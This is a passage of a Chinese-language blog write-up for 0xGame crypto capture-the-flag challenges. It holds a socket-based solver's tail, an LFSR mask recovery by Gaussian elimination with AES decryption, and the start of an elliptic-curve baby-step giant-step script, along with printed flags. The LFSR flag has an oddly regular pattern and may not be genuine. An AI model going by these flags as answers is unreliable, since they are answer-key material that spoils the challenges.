<span class=\"subst\">&#123;known_flag.decode(<span class=\"string\">&#x27;latin-1&#x27;</span>, <span class=\"string\">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] Attack stopped. Partial flag: <span class=\"subst\">&#123;known_flag.decode(<span class=\"string\">&#x27;latin-1&#x27;</span>, <span class=\"string\">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class=\"line\">        s.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    solve()</span><br></pre></td></tr></table></figure>\n\n<p>得到<code>0xGame&#123;5679df1b-4bae-4715-8433-4d52ccb258ef&#125;</code></p>\n<h2 id=\"LFSR\"><a href=\"#LFSR\" class=\"headerlink\" title=\"LFSR\"></a>LFSR</h2><p>线性反馈移位寄存器。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">int_to_bits</span>(<span class=\"params\">x, bit_length</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;将整数转为比特列表，高位在前&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> [(x &gt;&gt; i) &amp; <span class=\"number\">1</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(<span class=\"built_in\">range</span>(bit_length))]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bits_to_int</span>(<span class=\"params\">bits</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;将比特列表转为整数&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">str</span>(b) <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> bits), <span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">lfsr_step</span>(<span class=\"params\">state, mask, length=<span class=\"number\">128</span></span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;模拟LFSR的一步&quot;&quot;&quot;</span></span><br><span class=\"line\">    output = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(length):</span><br><span class=\"line\">        output ^= state[i] &amp; mask[i]</span><br><span class=\"line\">    new_state = state[<span class=\"number\">1</span>:] + [output]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> new_state, output</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">recover_mask_from_keystream</span>(<span class=\"params\">keystream, n=<span class=\"number\">128</span></span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;从密钥流恢复mask&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># 构建线性方程组: 对于 i = n 到 2n-1</span></span><br><span class=\"line\">    <span class=\"comment\"># keystream[i] = mask · [keystream[i-n], ..., keystream[i-1]]</span></span><br><span class=\"line\">    A = []</span><br><span class=\"line\">    b = []</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n, <span class=\"number\">2</span>*n):</span><br><span class=\"line\">        <span class=\"comment\"># 状态向量是前n个输出比特</span></span><br><span class=\"line\">        state_vector = keystream[i-n:i]</span><br><span class=\"line\">        A.append(state_vector)</span><br><span class=\"line\">        b.append(keystream[i])</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># GF(2)上的高斯消元</span></span><br><span class=\"line\">    size = n</span><br><span class=\"line\">    mat = [row + [b[i]] <span class=\"keyword\">for</span> i, row <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(A)]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 前向消元</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(size):</span><br><span class=\"line\">        <span class=\"comment\"># 找到主元</span></span><br><span class=\"line\">        pivot = -<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(col, size):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> mat[row][col] == <span class=\"number\">1</span>:</span><br><span class=\"line\">                pivot = row</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> pivot == -<span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">            </span><br><span class=\"line\">        <span class=\"comment\"># 交换行</span></span><br><span class=\"line\">        mat[col], mat[pivot] = mat[pivot], mat[col]</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 消去其他行</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(col + <span class=\"number\">1</span>, size):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> mat[row][col] == <span class=\"number\">1</span>:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(col, size + <span class=\"number\">1</span>):</span><br><span class=\"line\">                    mat[row][j] ^= mat[col][j]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 回代求解</span></span><br><span class=\"line\">    mask = [<span class=\"number\">0</span>] * size</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(<span class=\"built_in\">range</span>(size)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mat[i][i] == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> mat[i][size] == <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"comment\"># 自由变量，设为0</span></span><br><span class=\"line\">                mask[i] = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;矛盾方程 at row <span class=\"subst\">&#123;i&#125;</span>&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            mask[i] = mat[i][size]</span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i + <span class=\"number\">1</span>, size):</span><br><span class=\"line\">                mask[i] ^= mat[i][j] &amp; mask[j]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> mask</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 已知数据</span></span><br><span class=\"line\">random1 = <span class=\"number\">79262982171792651683253726993186021794</span></span><br><span class=\"line\">random2 = <span class=\"number\">121389030069245976625592065270667430301</span></span><br><span class=\"line\">ciphertext = <span class=\"string\">b&#x27;\\xb9WE&lt;\\x8bC\\xab\\x92J7\\xa9\\xe6\\xe8\\xd8\\x93D\\xcc\\xac\\xfdvfZ&#125;C\\xe6\\xd8;\\xf7\\x18\\xbauz`\\xb9\\xe0\\xe6\\xc6\\xae\\x00\\xfb\\x96%;k&#123;Ph\\xfa&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;分析LFSR...&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查数值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;random1: <span class=\"subst\">&#123;random1&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;random2: <span class=\"subst\">&#123;random2&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;random1 比特长度: <span class=\"subst\">&#123;random1.bit_length()&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;random2 比特长度: <span class=\"subst\">&#123;random2.bit_length()&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 转为比特序列（确保128位）</span></span><br><span class=\"line\">bits1 = int_to_bits(random1, <span class=\"number\">128</span>)</span><br><span class=\"line\">bits2 = int_to_bits(random2, <span class=\"number\">128</span>)</span><br><span class=\"line\">keystream = bits1 + bits2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;密钥流长度: <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(keystream)&#125;</span> 比特&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法1: 直接解线性方程组</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n方法1: 解线性方程组...&quot;</span>)</span><br><span class=\"line\">mask_bits = recover_mask_from_keystream(keystream)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mask_bits:</span><br><span class=\"line\">    mask = bits_to_int(mask_bits)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;找到 mask: <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(mask)&#125;</span>&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 验证mask</span></span><br><span class=\"line\">    test_state = bits1[:]  <span class=\"comment\"># 初始状态是random1的比特</span></span><br><span class=\"line\">    test_mask = mask_bits</span><br><span class=\"line\">    generated = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">        test_state, out = lfsr_step(test_state, test_mask)</span><br><span class=\"line\">        generated.append(out)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 检查是否匹配</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> generated[<span class=\"number\">128</span>:<span class=\"number\">256</span>] == bits2:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;✓ Mask 验证成功!&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;✗ Mask 验证失败&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 解密</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> order <span class=\"keyword\">in</span> [<span class=\"string\">&#x27;big&#x27;</span>, <span class=\"string\">&#x27;little&#x27;</span>]:</span><br><span class=\"line\">        key = mask.to_bytes(<span class=\"number\">16</span>, order)</span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">        plaintext = cipher.decrypt(ciphertext)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n<span class=\"subst\">&#123;order&#125;</span> 顺序解密:&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            decoded = plaintext.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>, errors=<span class=\"string\">&#x27;ignore&#x27;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;解码: <span class=\"subst\">&#123;decoded&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;0xGame&#x27;</span> <span class=\"keyword\">in</span> decoded <span class=\"keyword\">or</span> <span class=\"string\">&#x27;flag&#x27;</span> <span class=\"keyword\">in</span> decoded <span class=\"keyword\">or</span> <span class=\"string\">&#x27;&#123;&#x27;</span> <span class=\"keyword\">in</span> decoded:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;*** 找到 flag! ***&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;原始字节: <span class=\"subst\">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;方法1失败&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法2: 如果上面失败，尝试暴力搜索附近的mask值</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n方法2: 尝试附近可能的mask值...&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mask_bits:</span><br><span class=\"line\">    base_mask = bits_to_int(mask_bits)</span><br><span class=\"line\">    <span class=\"comment\"># 尝试一些变体</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> shift <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">10</span>, <span class=\"number\">11</span>):</span><br><span class=\"line\">        test_mask = (base_mask + shift) &amp; ((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">128</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> order <span class=\"keyword\">in</span> [<span class=\"string\">&#x27;big&#x27;</span>, <span class=\"string\">&#x27;little&#x27;</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                key = test_mask.to_bytes(<span class=\"number\">16</span>, order)</span><br><span class=\"line\">                cipher = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">                plaintext = cipher.decrypt(ciphertext)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;0xGame&#x27;</span> <span class=\"keyword\">in</span> plaintext:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;找到 flag! mask=<span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(test_mask)&#125;</span>, order=<span class=\"subst\">&#123;order&#125;</span>&quot;</span>)</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Flag: <span class=\"subst\">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>得到<code>0xGame&#123;124ab3f1-4c3e-4d2a-8e6f-9b5e6c7d8f90&#125;</code></p>\n<h2 id=\"ECC\"><a href=\"#ECC\" class=\"headerlink\" title=\"ECC\"></a>ECC</h2><p>大步小步法计算私钥s。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha256</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ===============================================================</span></span><br><span class=\"line\"><span class=\"comment\"># 第一部分：椭圆曲线和 Point 类的定义</span></span><br><span class=\"line\"><span class=\"comment\"># ===============================================================</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 椭圆曲线 secp256r1 (NIST P-256) 的参数</span></span><br><span class=\"line\">p = <span class=\"number\">0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff</span></span><br><span class=\"line\">a = <span class=\"number\">0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc</span></span><br><span class=\"line\">b = <span class=\"number\">0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 辅助函数：计算模逆元</span></span><br><span class=\"line\"><span class=\"comment\"># 使用扩展欧几里得算法</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inv</span>(<span class=\"params\">n, p</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">pow</span>(n, p - <span class=\"number\">2</span>, p)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Point</span>:</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    一个表示 secp256r1 椭圆曲线上点的类</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, x, y</span>):</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.x = x</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.y = y</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.a = a</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.b = b</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.p = p</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 定义点加法</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__add__</span>(<span class=\"params\">self, other</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 处理无穷远点 (用 None 表示)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> other <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable language_\">self</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 两个点相同，执行点倍增</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span> == other:</span><br><span class=\"line\">            <span class=\"comment\"># lam = (3 * x^2 + a) / (2 * y) mod p</span></span><br><span class=\"line\">            lam = (<span class=\"number\">3</span> * <span class=\"variable language_\">self</span>.x * <span class=\"variable language_\">self</span>.x + <span class=\"variable language_\">self</span>.a) * inv(<span class=\"number\">2</span> * <span class=\"variable language_\">self</span>.y, <span class=\"variable language_\">self</span>.p) % <span class=\"variable language_\">self</span>.p</span><br><span class=\"line\">        <span class=\"keyword\">else</span>: <span class=\"comment\"># 两个点不同</span></span><br><span class=\"line\">            <span class=\"comment\"># lam = (y2 - y1) / (x2 - x1) mod p</span></span><br><span class=\"line\">            lam = (other.y - <span class=\"variable language_\">self</span>.y) * inv(other.x - <span class=\"variable language_\">self</span>.x, <span class=\"variable language_\">self</span>.p) % <span class=\"variable language_\">self</span>.p</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 计算新点的坐标</span></span><br><span class=\"line\">        <span class=\"comment\"># x3 = lam^2 - x1 - x2 mod p</span></span><br><span class=\"line\">        x3 = (lam * lam - <span class=\"variable language_\">self</span>.x - other.x) % <span class=\"variable language_\">self</span>.p</span><br><span class=\"line\">        <span class=\"comment\"># y3 = lam * (x1 - x3) - y1 mod p</span></span><br><span class=\"line\">        y3 = (lam * (<span class=\"variable language_\">self</span>.x - x3) - <span class=\"variable language_\">self</span>.y) % <span class=\"variable language_\">self</span>.p</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">return</span> Point(x3, y3)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 定义标量乘法 (s * P)</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__mul__</span>(<span class=\"params\">self, s</span>):</span><br><span class=\"line\">        current = <span class=\"variable language_\">self</span></span><br><span class=\"line\">        res = <span class=\"literal\">None</span> <span class=\"comment\"># 这是无穷远点</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 使用快速幂的思想 (二进制展开法)</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> s &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> s &amp; <span class=\"number\">1</span>: <span class=\"comment\"># 如果当前位是 1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> res <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                    res = 